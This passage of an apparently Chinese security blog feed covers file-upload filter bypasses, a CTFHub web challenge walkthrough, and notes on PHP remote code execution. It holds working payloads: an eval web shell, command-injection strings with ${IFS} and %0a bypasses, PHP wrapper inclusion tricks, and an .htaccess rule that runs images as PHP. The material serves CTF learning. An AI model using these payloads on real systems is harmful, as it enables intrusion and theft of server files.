class="string">&#x27;upload_file&#x27;</span>)[<span class="number">0</span>].<span class="property">value</span>;</span><br><span class="line">        <span class="keyword">if</span> (file == <span class="literal">null</span> || file == <span class="string">&quot;&quot;</span>) &#123;</span><br><span class="line">            <span class="title function_">alert</span>(<span class="string">&quot;请选择要上传的文件!&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//定义允许上传的文件类型</span></span><br><span class="line">        <span class="keyword">var</span> allow_ext = <span class="string">&quot;.jpg|.png|.gif&quot;</span>;</span><br><span class="line">        <span class="comment">//提取上传文件的类型</span></span><br><span class="line">        <span class="keyword">var</span> ext_name = file.<span class="title function_">substring</span>(file.<span class="title function_">lastIndexOf</span>(<span class="string">&quot;.&quot;</span>));</span><br><span class="line">        <span class="comment">//判断上传文件类型是否允许上传</span></span><br><span class="line">        <span class="keyword">if</span> (allow_ext.<span class="title function_">indexOf</span>(ext_name) == -<span class="number">1</span>) &#123;</span><br><span class="line">            <span class="keyword">var</span> errMsg = <span class="string">&quot;该文件不允许上传，请上传&quot;</span> + allow_ext + <span class="string">&quot;类型的文件,当前文件类型为：&quot;</span> + ext_name;</span><br><span class="line">            <span class="title function_">alert</span>(errMsg);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><p><strong>绕过思路：1.直接本地禁用JS，不让其做检测 2.抓包，修改文件后缀名类型，绕过检测限制</strong></p><h2 id="服务器后端检测"><a href="#服务器后端检测" class="headerlink" title="服务器后端检测"></a>服务器后端检测</h2><h3 id="文件类型检测"><a href="#文件类型检测" class="headerlink" title="文件类型检测"></a>文件类型检测</h3><ul><li>此类检测防护主要是从content-type进行检测，检验请求中content-type是否符合可接受的上传类型(如”image/gif”,”image/png”,”image/jpeg”) </li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="keyword">if</span> ((<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>] == <span class="string">&#x27;image/jpeg&#x27;</span>) || (<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>] == <span class="string">&#x27;image/png&#x27;</span>) || (<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>] == <span class="string">&#x27;image/gif&#x27;</span>)) &#123;</span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span> . <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];          </span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123;</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;     </span><br></pre></td></tr></table></figure><p><strong>绕过思路：抓包将content-type改为可接受图片形式，即可绕过</strong></p><h3 id="文件头类型检测"><a href="#文件头类型检测" class="headerlink" title="文件头类型检测"></a>文件头类型检测</h3><ul><li>上个文件类型是检测content-type,比较好伪造，这个则是使用getimagesize()函数来获取文件的MIME类型，通过文件头进行判断文件类型</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">file_exists</span>(<span class="variable">$filename</span>))&#123;</span><br><span class="line">       <span class="variable">$info</span> = <span class="title function_ invoke__">getimagesize</span>(<span class="variable">$filename</span>);</span><br></pre></td></tr></table></figure><ul><li>文件头就是文件特定的标志，如二进制PE文件的4D5A，bmp文件的424D，zip文件的504B0304，各种常见文件的文件头类型大家可以查找了解一下，常见图片文件头如下：</li></ul><blockquote><p>gif: GIF89a</p><p>jpg,jpeg: FF D8 FF E0 00 10 4A 46 49 46</p><p>png: 89 50 4E 47 0D 0A</p></blockquote><p><strong>绕过思路：针对这种，上传木马恶意文件时，先使用编辑工具在数据最前面添加图片的文件头进行伪造，即可绕过</strong></p><h3 id="文件扩展名检测"><a href="#文件扩展名检测" class="headerlink" title="文件扩展名检测"></a>文件扩展名检测</h3><ul><li>这种类型有基于黑名单检测和白名单检测。通常基于黑名单是很不安全的，黑名单机制：只拦截名单中出现的扩展后缀名，其余默认放行。这就取决于名单中的扩展后缀名覆盖能力范围了，很难把所有的考虑全面，就很容易造成漏洞。</li></ul><p><strong>黑名单绕过思路：可以从服务器的解析特性进行分析，如特殊可解析后缀php3,php7,phtml,jspx等 如特殊的解析方式陌生后缀名，带换行后缀名，双后缀名等解析差异造成的漏洞。 还可以从混淆方面出发，后缀名大小写，点绕过，空格绕过，以及上传.htaccess配置控制文件权限和::$DATA数据流的使用</strong></p><ul><li>基于白名单相对于黑名单就安全很多了，要求只能是特定扩展名的文件才能够上传。</li></ul><p><strong>白名单绕过思路：MIME绕过，修改文件类型为白名单可接受的类型，以及%00，0x00截断绕过，这种场景针对save_path可控。</strong></p><ul><li>00截断原理其实很巧妙，利用场景是文件保存路径可控，这样一来我们上传的文件符合白名单就行，真正动手的地方在文件保存路径出，可以放上自己的webshell文件，然后在webshell文件后面添加%00,或0x00，再加一些字符，这样一来，系统在解析碰到00就会截断，后面字符就不起作用，只剩下前面的webshell文件名，就可以在url中进行访问了。%00和0x00的使用区别在于提交get请求时，是%00,会进行url自动解码动作，然后进入验证函数。0x00则是post请求直接进入验证函数。</li></ul><h3 id="htaccess"><a href="#htaccess" class="headerlink" title=".htaccess"></a>.htaccess</h3><ul><li>htaccess文件是apache服务器的一个配置文件，它负责相关目录下的网页配置</li></ul><ul><li>通过htaccess文件，可以帮助我们实现：网页301重定向、自定义404错误页面，改变文件扩展名、允许/阻止特定的用户或者目录的访问，禁止目录列表，配置默认文档等功能</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch &quot;\.jpg&quot;&gt;</span><br><span class="line">  SetHandler application/x-httpd-php </span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure><ul><li>其中，SetHandler application/x-httpd-php意思是设置当前目录所有文件都使用php解析，那么无论上传任何文件，只要符合php语言代码规范，就会被当做PHP执行，不符合规则则报错</li></ul>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTFHUB-WEB</title>
      <link href="/post/7e6bea45.html"/>
      <url>/post/7e6bea45.html</url>
      
        <content type="html"><![CDATA[<span id="more"></span><h1 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h1><h2 id="eval执行"><a href="#eval执行" class="headerlink" title="eval执行"></a>eval执行</h2><p>打开环境发现一段php代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;cmd&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="variable">$_REQUEST</span>[<span class="string">&quot;cmd&quot;</span>]);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>发现参数为cmd</p><p><code>payload：?cmd=phpinfo();</code><br>有回显，说明可以利用系统命令函数</p><p><code>payload：?cmd=system(&quot;ls /&quot;);</code><br>有回显，并且看到有关于flag的文件，读取它</p><p><code>payload：?cmd=system(&quot;ls / | cat /flag_9712&quot;);</code><br>得到flag</p><h2 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h2><p>打开环境发现一段php代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">strpos</span>(<span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>], <span class="string">&quot;flag&quot;</span>)) &#123;</span><br><span class="line">        <span class="keyword">include</span> <span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>];</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Hacker!!!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;hr&gt;</span><br><span class="line">i have a &lt;a href=<span class="string">&quot;shell.txt&quot;</span>&gt;shell&lt;/a&gt;, how to <span class="keyword">use</span> <span class="title">it</span> ?</span><br></pre></td></tr></table></figure><p>介绍一下陌生函数：</p><blockquote><p>strpos(x,y)    查看y是否在x里</p><p>include    将文件里的代码当作原来文件的代码执行</p></blockquote><p>点击shell得到一串php代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;ctfhub&#x27;</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>根据代码得出：需要用GET传参方式传参，参数为file</p><p><code>payload：?file=shell.txt</code><br>点击shell得到php代码：<code>&lt;?php eval($_REQUEST[&#39;ctfhub&#39;]);?&gt;</code></p><p><code>payload：以post方式传参：ctfhub=system(&quot;ls&quot;)</code><br>根据回显发现没有有关flag的文件，那就读取上级目录看看</p><p><code>payload：ctfhub=system(&quot;ls /&quot;)</code><br>根据回显发现flag</p><p><code>payload：ctfhub=system(&quot;cat /flag&quot;)</code><br>得到flag</p><h2 id="php-input"><a href="#php-input" class="headerlink" title="php://input"></a>php://input</h2><p>打开环境发现php代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> ( <span class="title function_ invoke__">substr</span>(<span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>], <span class="number">0</span>, <span class="number">6</span>) === <span class="string">&quot;php://&quot;</span> ) &#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>]);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Hacker!!!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;hr&gt;</span><br><span class="line">i don<span class="string">&#x27;t have shell, how to get flag? &lt;br&gt;</span></span><br><span class="line"><span class="string">&lt;a href=&quot;phpinfo.php&quot;&gt;phpinfo&lt;/a&gt;</span></span><br></pre></td></tr></table></figure><p>根据代码得出：需要以GET方式传入一个名为file参数的数据，点击phpinfo()发现，php://input可以使用</p><p><code>payload：?file=php://input</code><br>根据<code>php://input</code>规则，需要POST传入数据</p><p><code>payload：&lt;?php system(&quot;ls&quot;);?&gt;</code><br>根据回显发现没有flag，查找上级目录</p><p><code>payload：&lt;?php system(&quot;ls /&quot;);?&gt;</code><br>发现flag，查看</p><p><code>payload：&lt;?php system(&quot;cat /flag_4801&quot;);?&gt;</code><br>得到flag</p><h2 id="读取源代码"><a href="#读取源代码" class="headerlink" title="读取源代码"></a>读取源代码</h2><p>打开环境得到php代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(E_ALL);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> ( <span class="title function_ invoke__">substr</span>(<span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>], <span class="number">0</span>, <span class="number">6</span>) === <span class="string">&quot;php://&quot;</span> ) &#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>]);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Hacker!!!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;hr&gt;</span><br><span class="line">i don<span class="string">&#x27;t have shell, how to get flag? &lt;br&gt;</span></span><br><span class="line"><span class="string">flag in &lt;code&gt;/flag&lt;/code&gt;</span></span><br></pre></td></tr></table></figure><p>根据提示使用php://input发现不管用，用一下新的伪协议吧——php://filter</p><p><code>payload：?file=php://filter/resource=/flag</code><br>flag一下子就出来了呢</p><h2 id="远程包含"><a href="#远程包含" class="headerlink" title="远程包含"></a>远程包含</h2><p>打开环境得到代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">strpos</span>(<span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>], <span class="string">&quot;flag&quot;</span>)) &#123;</span><br><span class="line">        <span class="keyword">include</span> <span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>];</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Hacker!!!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;hr&gt;</span><br><span class="line">i don<span class="string">&#x27;t have shell, how to get flag?&lt;br&gt;</span></span><br><span class="line"><span class="string">&lt;a href=&quot;phpinfo.php&quot;&gt;phpinfo&lt;/a&gt;</span></span><br></pre></td></tr></table></figure><p>用一下php://input吧，一下子就得到了flag呢</p><p><code>payload：&lt;?php system(&quot;cat /flag&quot;);?&gt;</code></p><h2 id="命令注入"><a href="#命令注入" class="headerlink" title="命令注入"></a>命令注入</h2><p>根据回显得出这是一个ping IP的题目</p><p>ping一下baidu.com得到回显</p><p><code>payload：baidu.com | ls</code><br>得到回显并发现可疑.php文件，打开发现打不开该文件，试一下base64吧</p><p><code>payload：baidu.com | cat 31327443624755.php | base64 </code><br>再解码得到flag</p><h2 id="过滤cat"><a href="#过滤cat" class="headerlink" title="过滤cat"></a>过滤cat</h2><p>直接上payload</p><p><code>payload：baidu.com | ls</code><br>得到flag文件，但是cat被过滤了，换个吧</p><p><code>payload：baidu.com | more flag_34911944417894.php | base64  </code><br>得到加密后的flag，解码得到flag</p><h2 id="过滤空格"><a href="#过滤空格" class="headerlink" title="过滤空格"></a>过滤空格</h2><p>直接上payload</p><p><code>payload：baidu.com | ls</code><br>发现没有东西，空格被过滤</p><p><code>payload：baidu.com$&#123;IFS&#125;|$&#123;IFS&#125;ls</code><br>得到flag文件，查看该文件</p><p><code>payload：baidu.com$&#123;IFS&#125;|$&#123;IFS&#125;cat$&#123;IFS&#125;flag_31123320624556.php$&#123;IFS&#125;|$&#123;IFS&#125;base64</code><br>解密得到flag</p><h2 id="过滤目录分隔符"><a href="#过滤目录分隔符" class="headerlink" title="过滤目录分隔符"></a>过滤目录分隔符</h2><p><code>payload：baidu.com | ls</code><br>得到flag目录</p><p><code>payload：baidu.com;cd flag_is_here;ls</code><br>得到flag文件，查看文件</p><p><code>payload：baidu.com;cd flag_is_here;cat flag_4088165719730.php|base64</code><br>解码得到flag</p><h2 id="过滤运算符"><a href="#过滤运算符" class="headerlink" title="过滤运算符"></a>过滤运算符</h2><p>过滤了运算符，但是**;**漏掉了</p><p><code>payload：baidu.com;ls</code><br>查看flag文件</p><p>base64 *.php &lt;=&gt;*,php|base64</p><p><code>payload：baidu.com;base64 flag_80902931728195.php</code></p><h2 id="综合过滤练习"><a href="#综合过滤练习" class="headerlink" title="综合过滤练习"></a>综合过滤练习</h2><p>看完代码傻眼了，啥都被过滤了，哎~~~</p><p>看看过滤笔记再来试试看<br>可以用%0a(换行符)，但是需要在url上使用</p><p><code>payload：baidu.com%0als</code><br>得到flag目录，继续搞</p><p><code>payload：baidu.com%0acd$&#123;IFS&#125;fl&#39;&#39;ag_is_here%0als</code><br>得到flag文件</p><p><code>payload：baidu.com%0acd$&#123;IFS&#125;fl&#39;&#39;ag_is_here%0abase64$&#123;IFS&#125;fl&#39;&#39;ag_248952873310635.php</code><br>解码得到flag</p>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>RCE(远程代码执行漏洞)</title>
      <link href="/post/de7b7d00.html"/>
      <url>/post/de7b7d00.html</url>
      
        <content type="html"><![CDATA[<span id="more"></span><h1 id="形成原因"><a href="#形成原因" class="headerlink" title="形成原因"></a>形成原因</h1><blockquote><p>应用有时需要调用一些<strong>执行系统命令的函数</strong>，如PHP中的<strong>system、exec、shell_exec、passthru、popen、proc_popen</strong>等，当用户能<strong>控制这些函数的参数</strong>，并且开发人员对<strong>这个参数没有严格的过滤</strong>时就可以将恶意系统命令拼接到正常命令中，从而造成命令执行攻击，这就是<strong>命令执行漏洞。</strong></p></blockquote><h1 id="可能存在命令执行漏洞的函数（PHP）"><a href="#可能存在命令执行漏洞的函数（PHP）" class="headerlink" title="可能存在命令执行漏洞的函数（PHP）"></a>可能存在命令执行漏洞的函数（PHP）</h1><ol><li>利用系统函数实现命令执行的函数</li></ol><blockquote><p>eval()<br>assert()<br>preg_replace()<br>call_user_func()</p></blockquote><ol start="2"><li>直接执行系统命令的代码函数</li></ol><blockquote><p>system()<br>exec()<br>shell_exec()&amp;(``)<br>passthru()<br>pcntl_exec()<br>popen()<br>proc_open()</p></blockquote><h1 id="命令拼接符号"><a href="#命令拼接符号" class="headerlink" title="命令拼接符号"></a>命令拼接符号</h1><ol><li>Windows的系统命令拼接符</li></ol><table><thead><tr><th>拼接符</th><th>示例</th><th>拼接符的详解</th></tr></thead><tbody><tr><td>&amp;</td><td>A&amp;B</td><td>无论A是false还是true，B都执行，即互不影响</td></tr><tr><td>&amp;&amp;</td><td>A&amp;&amp;B</td><td>具有短路效果，A是false，B就不执行，有短路效果</td></tr><tr><td>|</td><td>A|B</td><td>表示A命令语句的输出，作为B命令语句的输入执行。当A为false的时候将不会执行</td></tr><tr><td>||</td><td>A||B</td><td>表示A命令语句执行失败，然后才执行B命令语句</td></tr></tbody></table><ol start="2"><li>Linux的系统命令拼接符</li></ol><blockquote><p><strong>&amp;</strong>    使命令在后台运行<br><strong>;</strong>    进行多条命令的无关联执行，每一条执行结果互不影响<br><strong>&amp;&amp;</strong>    与Windows一样，左边成功才执行右边<br><strong>||</strong>    与Windows一样，前面执行失败才执行后面<br><strong>()</strong>    执行多个命令时，需要用命令分隔符分号隔开每个命令，并使用**()**把所有命令组合起来</p></blockquote><h1 id="php伪协议"><a href="#php伪协议" class="headerlink" title="php伪协议"></a>php伪协议</h1><p>php支持的伪协议</p><blockquote><p>file://    访问本地文件<br>http://    访问HTTP(s)网址<br>ftp://    访问FTP(s) URLs<br>php://    访问各个输入/输出流（I/O streams）<br>zlib://    压缩流<br>data://    数据（RFC 2397）<br>glob://    查找匹配的文件路径模式<br>phar://    PHP 归档<br>ssh2://    Secure Shell 2<br>rar://    RAR<br>ogg://    音频流<br>expect://    处理交互式的流</p></blockquote><h2 id="php-filter"><a href="#php-filter" class="headerlink" title="php://filter"></a>php://filter</h2><blockquote><p>获取指定文件源码。当他与包含函数结合时，php://filter流会被当作php文件执行。</p></blockquote><p>协议参数</p><table><thead><tr><th>名称</th><th>描述</th></tr></thead><tbody><tr><td>resource=&lt;要过滤的数据流&gt;</td><td>这个参数是必须的。它指定了你要筛选过滤的数据流。</td></tr><tr><td>read=&lt;读链的筛选列表&gt;</td><td>该参数可选。可以设定一个或多个过滤器名称，以管道符（`</td></tr><tr><td>write=&lt;写链的筛选列表&gt;</td><td>该参数可选。可以设定一个或多个过滤器名称，以管道符（`</td></tr><tr><td>&lt;；两个链的筛选列表&gt;</td><td>任何没有以 <code>read=</code> 或 <code>write=</code> 作前缀 的筛选器列表会视情况应用于读或写链。</td></tr></tbody></table><p>常用：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">php:<span class="comment">//filter/read=convert.base64-encode/resource=index.php</span></span><br><span class="line">php:<span class="comment">//filter/resource=index.php</span></span><br><span class="line"></span><br><span class="line">convert.base64-encode过滤器</span><br></pre></td></tr></table></figure><h2 id="data"><a href="#data" class="headerlink" title="data://"></a>data://</h2><blockquote><p>数据流封装器，以传递相应格式的数据。可以让用户来控制输入流，当它与包含函数结合时，用户输入的data://流会被当作php文件执行。</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 打印 &quot;I love PHP&quot;</span></span><br><span class="line"><span class="keyword">echo</span>  <span class="title function_ invoke__">file_get_contents</span> ( <span class="string">&#x27;data://text/plain;base64,SSBsb3ZlIFBIUAo=&#x27;</span> );</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="file"><a href="#file" class="headerlink" title="file://"></a>file://</h2><blockquote><p>用于访问本地文件系统，并且不受allow_url_fopen，allow_url_include影响<br>file://协议主要用于访问文件(绝对路径、相对路径以及网络路径)<br>比如：?file=file:///etc/passsword</p></blockquote><h2 id="php"><a href="#php" class="headerlink" title="php://"></a>php://</h2><blockquote><p>在allow_url_fopen，allow_url_include都关闭的情况下可以正常使用<br>php://作用为访问输入输出流</p></blockquote><h2 id="php-input"><a href="#php-input" class="headerlink" title="php://input"></a>php://input</h2><blockquote><p><strong>php://input</strong>可以访问请求的原始数据的只读流，将post请求的数据当作php代码执行。当传入的参数作为文件名打开时，可以将参数设为php://input,同时post想设置的文件内容，php执行时会将post内容当作文件内容。从而导致任意代码执行。</p></blockquote><p>例如：?cmd=php://input<br>POST数据：<code>&lt;?php phpinfo()?&gt;</code><br>注意：<br>当<code>enctype=&quot;multipart/form-data&quot;</code>的时候<code>php://input</code>是无效的<br>遇到<code>file_get_contents()</code>要想到用<code>php://input</code>绕过</p><h2 id="zip"><a href="#zip" class="headerlink" title="zip://"></a>zip://</h2><blockquote><p>zip:// 可以访问压缩包里面的文件。当它与包含函数结合时，zip://流会被当作php文件执行。从而实现任意代码执行。</p><p>例如：<code>zip://[压缩包绝对路径]#[压缩包内文件]</code></p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">zip:<span class="comment">//中只能传入绝对路径。</span></span><br><span class="line">要用<span class="comment">#分隔压缩包和压缩包里的内容，并且#要用url编码%23</span></span><br><span class="line">只需要是zip的压缩包即可，后缀名可以任意更改。</span><br><span class="line">相同的类型的还有zlib:<span class="comment">//和bzip2://</span></span><br></pre></td></tr></table></figure><p>例如：?file=zip://D:\zip.jpg%23phpinfo.txt</p><p><a href="https://segmentfault.com/a/1190000018991087">PHP伪协议总结 </a></p><h1 id="各种绕过"><a href="#各种绕过" class="headerlink" title="各种绕过"></a>各种绕过</h1><ul><li>cat被过滤时</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">more     #一页一页的显示档案内容</span><br><span class="line">less     #与 more 类似</span><br><span class="line">head     #查看头几行</span><br><span class="line">tac      #从最后一行开始显示，可以看出 tac 是 cat 的反向显示</span><br><span class="line">tail     #查看尾几行</span><br><span class="line">nl       #显示的时候，顺便输出行号</span><br><span class="line">od       #以二进制的方式读取档案内容</span><br><span class="line">sort     #可以查看</span><br><span class="line">uniq     #可以查看</span><br><span class="line">//vi       #一种编辑器，这个也可以查看</span><br><span class="line">//vim      #一种编辑器，这个也可以查看</span><br><span class="line">//file -f  #报错出具体内容</span><br><span class="line">//sh /flag 2&gt;%261  #报错出文件内容</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">使用转义符号</span></span><br><span class="line">ca\t /fl\ag</span><br><span class="line">cat fl&#x27;&#x27;ag</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">拼接法</span></span><br><span class="line"></span><br><span class="line">a=fl;b=ag;cat$IFS$a$b</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">使用空变量$*和<span class="variable">$@</span>，<span class="variable">$x</span>,<span class="variable">$&#123;x&#125;</span>绕过</span></span><br><span class="line"><span class="meta prompt_">ca$</span><span class="language-bash">*t flag || ca<span class="variable">$@t</span> flag || ca<span class="variable">$5t</span> flag ca<span class="variable">$&#123;5&#125;</span>t flag</span></span><br><span class="line"></span><br><span class="line">find    